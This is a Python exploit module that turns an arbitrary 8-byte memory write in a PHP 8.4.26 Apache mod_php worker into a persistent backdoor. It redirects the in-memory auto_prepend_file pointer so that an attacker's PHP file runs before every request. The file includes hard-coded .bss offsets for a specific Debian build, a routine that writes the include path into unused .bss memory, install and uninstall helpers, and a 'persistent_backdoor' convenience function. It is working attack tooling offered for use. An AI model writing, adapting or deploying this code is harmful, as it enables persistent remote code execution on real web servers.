#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# INDEX: persist auto_prepend_file into per-request backdoor | apache fpm | narrow write + on-disk php file
"""
PG(auto_prepend_file) persistent dispatch primitive.

Turns a single in-process arbitrary 8-byte write into a PERSISTENT, per-request
backdoor on a surviving Apache/FPM worker.

Mechanism
---------
PG(auto_prepend_file) is the live value of php.ini's auto_prepend_file: a
`char *` field inside the `core_globals` struct (struct _php_core_globals,
main/php_globals.h). php_execute_script_ex() reads it once per request
(main.c:2557) and, if non-NULL, zend_execute()s that file BEFORE the real
script. Point PG(auto_prepend_file) at an attacker-controlled PHP file path that
exists on disk and every subsequent request served by that worker auto-includes
it first -> persistent per-request RCE for the life of the worker.

  core_globals + 0xa0  ==  PG(auto_prepend_file)   (char *)
  core_globals + 0xa8  ==  PG(auto_append_file)    (char *)

The +0xa0 field offset is source-defined (main/php_globals.h; struct size 616 on
both cli and apache builds) and stable across SAPIs. Only the core_globals .bss
vaddr is per-binary (see APACHE_8426_OFFSETS).

Requirements
------------
  * binbase / pie_base of the target binary (libphp.so for apache mod_php),
  * a callable write8(addr, qword) that stores 8 bytes at an absolute address,
  * an attacker-controlled PHP file present at a readable path on the target
    (an uploaded file, something in /tmp, or a data:// wrapper string).

SAPI/binary agnostic: only the base, the offsets table and the write8 callable
are needed.

Oracle caveat
-------------
ini_get('auto_prepend_file') reports the INI-STORED value, NOT the live PG
pointer -- do NOT use it to verify. Verify by REQUEST BEHAVIOR: does a follow-up
request execute the prepend payload (emit its marker)?

Offsets below are for the 8.4.26-apache mod_php build (libphp.so, Debian trixie
13, NTS). Pure stdlib. python3 -I safe.
"""

import struct


# Offsets for the 8.4.26-apache mod_php build (libphp.so, Debian trixie 13, NTS).
# Only the core_globals .bss vaddr (0x132c600) is per-binary; the field offsets
# (+0xa0 / +0xa8) are source-defined.
#   core_globals vaddr (apache) .... 0x132c600
#   auto_prepend_file = +0xa0 ....... 0x132c6a0   <-- persistent dispatch target
#   auto_append_file  = +0xa8 ....... 0x132c6a8
APACHE_8426_OFFSETS = {
    # the per-binary value: the core_globals .bss vaddr
    "auto_prepend_off": 0x132c600 + 0xa0,   # = 0x132c6a0  PG(auto_prepend_file)
    "auto_append_off":  0x132c600 + 0xa8,   # = 0x132c6a8  PG(auto_append_file)
    # Exported, slide-locked .bss engine-global vaddrs (binbase/pie-relative) on
    # the APACHE libphp.so. Any one leaked pointer of known class recovers base
    # (base = leak - vaddr); core_globals is also the write target above.
    "bss_anchors": {
        "core_globals":         0x132c600,  # PG() base (NTS build)
        "executor_globals":     0x132d340,  # EG()
        "compiler_globals":     0x132db00,  # CG()
        "sapi_globals":         0x132cba0,  # SG()
        "basic_globals":        0x13176c0,  # BG()  (== apache bg_unserialize base)
        "sapi_module":          0x132ca80,
        "zend_signal_globals":  0x132f700,
        "zend_one_char_string": 0x1330800,
        "php_rfc1867_callback": 0x132ca68,  # BSS fn ptr; address usable as anchor
    },
    # Scratch region to synthesize the include-path C-string into, when the
    # caller does not already have a controlled string at a known address.
    # It is the zero-filled, mapped, UNUSED tail of the last .bss page:
    #   RW PT_LOAD ends (MemSiz) at 0x1333460; the loader maps through the page
    #   boundary 0x1334000, so 0x1333460..0x1334000 (2976 B) is zeroed, mapped,
    #   writable and never touched by the engine at request time. We park the
    #   path string at 0x1333500 (8-aligned, comfortably inside the slack).
    "pg_scratch_off":   0x1333500,
    "pg_scratch_limit": 0x1334000,          # page end; keep path+NUL below this
}


# Primitive
def apf_addr(base, off):
    """Absolute address of PG(auto_prepend_file) = base + core_globals + 0xa0."""
    return base + off["auto_prepend_off"]


def apf_append_addr(base, off):
    """Absolute address of PG(auto_append_file) = base + core_globals + 0xa8."""
    return base + off["auto_append_off"]


def write_cstring(write8, addr, s):
    """Store the NUL-terminated bytes `s` at absolute `addr` using the 8-byte
    write8(addr, qword) primitive. Writes whole 8-byte little-endian words
    (last word zero-padded, which also supplies the NUL terminator). Returns the
    number of bytes (incl. terminator+padding) written."""
    data = s if isinstance(s, (bytes, bytearray)) else s.encode()
    data = bytes(data) + b"\x00"
    if len(data) % 8:
        data += b"\x00" * (8 - (len(data) % 8))
    for i in range(0, len(data), 8):
        (word,) = struct.unpack("<Q", data[i:i + 8])
        write8(addr + i, word)
    return len(data)


def install(base, off, write8, include_path, str_addr=None):
    """Install the persistent dispatch: make PG(auto_prepend_file) point at a
    readable NUL-terminated string holding `include_path`.

    base         : load base of the target binary (libphp.so for apache mod_php).
    off          : offsets table (APACHE_8426_OFFSETS, or load_offsets(...) once
                   the three keys above are promoted into BUILTIN_OFFSETS).
    write8       : callable write8(abs_addr, qword) -> stores 8 bytes.
    include_path : path (or wrapper, e.g. "data://...") to a PHP file on target.
                   `include_path` must already exist/resolve on the target.
    str_addr     : absolute address of an EXISTING attacker-controlled copy of
                   the path bytes (NUL-terminated). If None, the path string is
                   synthesized into the .bss scratch region (pg_scratch_off) via
                   the write8 primitive, and PG is pointed there.

    Returns (apf_target_addr, string_addr): the address written to and the
    address PG(auto_prepend_file) now points at.
    """
    target = apf_addr(base, off)
    if str_addr is None:
        scratch = base + off["pg_scratch_off"]
        need = len(include_path.encode() if isinstance(include_path, str)
                   else include_path) + 1
        limit = base + off.get("pg_scratch_limit", off["pg_scratch_off"] + 0x800)
        if scratch + ((need + 7) & ~7) > limit:
            raise ValueError(
                "include_path too long for .bss scratch slack (%d B, cap %d); "
                "pass str_addr pointing at a controlled heap/request string"
                % (need, limit - scratch))
        write_cstring(write8, scratch, include_path)
        str_addr = scratch
    write8(target, str_addr)
    return target, str_addr


def uninstall(base, off, write8):
    """Clear PG(auto_prepend_file) back to NULL (stop the per-request include)."""
    target = apf_addr(base, off)
    write8(target, 0)
    return target


# Convenience: the canonical persistent-backdoor one-liner once base+write8 are in hand.
# The include file itself (e.g. /tmp/p.php) is placed on disk by the caller
# (upload, file write, etc.); this only redirects PG at it.
def persistent_backdoor(base, write8, include_path="/tmp/p.php",
                        off=None, str_addr=None):
    if off is None:
        off = APACHE_8426_OFFSETS
    return install(base, off, write8, include_path, str_addr=str_addr)


if __name__ == "__main__":
    # Self-test (no target): show the derived addresses for a sample base and
    # exercise write_cstring against an in-memory fake, so `python3 -I
    # auto_prepend_persist.py` validates the arithmetic without a live binary.
    import sys
    base = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0x7f0000000000
    off = APACHE_8426_OFFSETS
    print("base                 = 0x%x" % base)
    print("core_globals         = 0x%x" % (base + off["bss_anchors"]["core_globals"]))
    print("PG(auto_prepend_file)= 0x%x  (base+0x%x)"
          % (apf_addr(base, off), off["auto_prepend_off"]))
    print("PG(auto_append_file) = 0x%x  (base+0x%x)"
          % (apf_append_addr(base, off), off["auto_append_off"]))
    print("scratch              = 0x%x .. 0x%x"
          % (base + off["pg_scratch_off"], base + off["pg_scratch_limit"]))
    mem = {}
    def w8(a, q): mem[a] = q
    tgt, sa = install(base, off, w8, "/tmp/p.php")
    blob = b"".join(struct.pack("<Q", mem[sa + i]) for i in range(0, 16, 8))
    print("after install: PG -> 0x%x ; scratch bytes = %r"
          % (mem[tgt], blob.split(b"\x00", 1)[0]))
    assert mem[tgt] == sa
    assert blob.startswith(b"/tmp/p.php\x00")
    print("SELF-TEST OK")
